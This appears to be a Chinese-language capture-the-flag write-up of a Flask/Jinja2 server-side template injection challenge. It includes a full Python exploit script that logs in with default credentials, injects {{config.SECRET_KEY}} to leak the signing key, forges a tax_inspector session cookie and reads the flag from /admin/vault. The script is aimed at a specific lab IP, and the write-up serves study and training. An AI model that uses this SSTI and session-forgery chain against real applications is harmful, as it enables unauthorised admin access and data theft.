---
title: "WEB-TaxSystem_SSTI19"
ctf: "未知赛事"
date: 2026-05-30
category: web
difficulty: easy
points: 350
flag_format: "flag{...}"
author: "Codex"
---

# WEB-TaxSystem_SSTI19

## 概述

这题的核心是一个典型的 Flask/Jinja2 服务端模板注入。系统允许已登录用户通过 `/api/import` 修改税务档案中的 `state` 和 `custom_footer` 字段；当 `state` 被改成 `AUDIT_PENDING` 时，后端会把 `custom_footer` 直接拼进 `render_template_string()` 渲染。利用这一点可以先泄露真实 `SECRET_KEY`，再伪造 `tax_inspector` 身份访问 `/admin/vault` 读取 flag。

## 解题过程

### 第一步：审计源码，确认利用点

源码里先给了一个可直接登录的默认账号，在 `init_db.py` 中：

```python
cur.execute('INSERT INTO users (username, password, role) VALUES ("admin", "123456", "admin")')
```

然后在 `app.py` 中可以看到 `/api/import` 允许修改以下字段：

```python
allowed_fields = ['income', 'deductions', 'state', 'custom_footer', 'year']
```

同时 `/preview/<profile_id>` 在 `state == 'AUDIT_PENDING'` 时会进入特殊渲染分支：

```python
if state == 'AUDIT_PENDING':
    custom_footer = profile['custom_footer']
    ...
    return render_template_string(template_html)
```

这说明我们可以：

1. 使用 `admin/123456` 登录
2. 选中一个属于当前用户的 `profile_id`
3. 通过 `/api/import` 把 `state` 改成 `AUDIT_PENDING`
4. 把 `custom_footer` 改成 `{{config.SECRET_KEY}}`
5. 访问 `/preview/<profile_id>`，让模板执行并泄露真实 Flask 签名密钥

### 第二步：泄露真实 SECRET_KEY

实际访问预览页后，页脚会显示出真实密钥：

```text
secret_tax_key_2026_xoxo
```

这里还有一个小坑：靶机当前的 `/dashboard` 会返回 `500 Internal Server Error`，所以利用脚本不应该依赖“登录后跳转 dashboard 再抓取最新 profile_id”的逻辑。更稳妥的做法是直接遍历可访问的 `profile_id`，只要某个档案能被 `/api/import` 成功修改，并且 `/preview/<id>` 能正常回显结果，就可以继续利用。

### 第三步：伪造 `tax_inspector` 会话读取金库

拿到密钥后，就可以构造 Flask session：

```python
{"role": "tax_inspector", "user_id": 1}
```

带着伪造后的 `session` Cookie 请求 `/admin/vault`，即可通过权限检查并看到 flag。

```python
import re
import sys

import requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface


BASE_URL = "http://47.99.147.34:16610"
LOGIN_DATA = {"username": "admin", "password": "123456"}
SSTI_PAYLOAD = "{{config.SECRET_KEY}}"
MAX_PROFILE_ID = 300


def build_signed_cookie(secret_key: str) -> str:
    app = Flask(__name__)
    app.secret_key = secret_key
    serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    if serializer is None:
        raise RuntimeError("failed to build Flask session serializer")
    return serializer.dumps({"role": "tax_inspector", "user_id": 1})


def extract_footer_secret(html: str) -> str:
    match = re.search(r'italic text-center">\s*([^<]+?)\s*</div>', html, re.S)
    if not match:
        raise RuntimeError("failed to extract leaked SECRET_KEY from preview page")
    return match.group(1).strip()


def extract_flag(html: str) -> str:
    match = re.search(r"flag\{[^}]+\}", html)
    if not match:
        raise RuntimeError("failed to extract flag from admin vault")
    return match.group(0)


def find_working_profile(session: requests.Session) -> int:
    for profile_id in range(1, MAX_PROFILE_ID + 1):
        import_resp = session.post(
            f"{BASE_URL}/api/import",
            json={
                "profile_id": profile_id,
                "data": {
                    "state": "AUDIT_PENDING",
                    "custom_footer": SSTI_PAYLOAD,
                },
            },
            timeout=15,
        )
        if import_resp.status_code != 200:
            continue

        preview_resp = session.get(f"{BASE_URL}/preview/{profile_id}", timeout=15)
        if preview_resp.status_code != 200:
            continue

        if SSTI_PAYLOAD not in preview_resp.text:
            return profile_id

    raise RuntimeError("failed to find a usable profile_id")


def main() -> int:
    session = requests.Session()

    login_resp = session.post(
        f"{BASE_URL}/login",
        data=LOGIN_DATA,
        allow_redirects=False,
        timeout=15,
    )
    if login_resp.status_code != 302:
        raise RuntimeError(f"login failed: {login_resp.status_code}")

    profile_id = find_working_profile(session)
    preview_resp = session.get(f"{BASE_URL}/preview/{profile_id}", timeout=15)
    secret_key = extract_footer_secret(preview_resp.text)
    forged_cookie = build_signed_cookie(secret_key)

    vault_resp = requests.get(
        f"{BASE_URL}/admin/vault",
        cookies={"session": forged_cookie},
        timeout=15,
    )
    print(f"PROFILE_ID: {profile_id}")
    print(f"SECRET_KEY: {secret_key}")
    print(f"FLAG: {extract_flag(vault_resp.text)}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
```

运行结果：

```text
PROFILE_ID: 1
SECRET_KEY: secret_tax_key_2026_xoxo
FLAG: flag{c5b34df2e74dc988b73fdca3541f9238}
```

## 最终 flag

```text
flag{c5b34df2e74dc988b73fdca3541f9238}
```
